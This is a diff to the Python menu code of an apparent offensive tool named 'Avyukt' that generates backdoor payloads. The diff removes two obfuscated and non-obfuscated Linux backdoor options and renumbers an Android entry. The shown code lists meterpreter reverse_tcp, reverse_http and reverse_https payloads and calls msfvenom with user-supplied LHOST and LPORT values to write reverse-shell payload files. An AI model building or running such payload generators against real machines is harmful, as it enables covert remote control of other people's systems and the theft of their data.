@@ -573,11 +573,8 @@ def list_info():
     print(Fore.WHITE + "\n\t\t[8] python/meterpreter/reverse_https")
     print(Fore.WHITE + "\n\t\t[9] python/meterpreter/reverse_tcp")
     print(Fore.WHITE + "\n\t\t[10] python/meterpreter/reverse_http")
-    print(Fore.RED + "\n\t\tAvyukt Linux Backdoors" + Fore.WHITE + "(Good)")
-    print(Fore.WHITE + "\n\t\t[11] python/Avyukt/reverse_tcp" + Fore.RED + "(Obfuscated Linux Backdoor)")
-    print(Fore.WHITE + "\n\t\t[12] python/Avyukt/reverse_tcp" + Fore.RED + "(Non-Obfuscated Linux Backdoor)")
     print(Fore.RED + "\n\t\tAndroid Backdoors")
-    print(Fore.WHITE + "\n\t\t[13] android/meterpreter/reverse_tcp")
+    print(Fore.WHITE + "\n\t\t[11] android/meterpreter/reverse_tcp")
     print(Fore.WHITE + "\n\t[+] Press Enter to return to Menu")
 
 
@@ -748,15 +745,8 @@ def menu():
                     subprocess.call(
                         "msfvenom --payload python/meterpreter/reverse_tcp LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".py",
                         shell=True)
+
             if "11" in payload_selection:
-                clear_screen()
-                gen_linux_backdoor()
-
-            if "12" in payload_selection:
-                clear_screen()
-                gen_linux_nonbackdoor()
-
-            if "13" in payload_selection:
                 iadd = raw_input(Fore.WHITE + "Avyukt>: Please enter LHOST for the payload >> ")
                 prt = raw_input(Fore.WHITE + "Avyukt>: Please enter LPORT for the payload >> ")
                 name = raw_input(Fore.WHITE + "Avyukt>: Please enter payload name >> ")
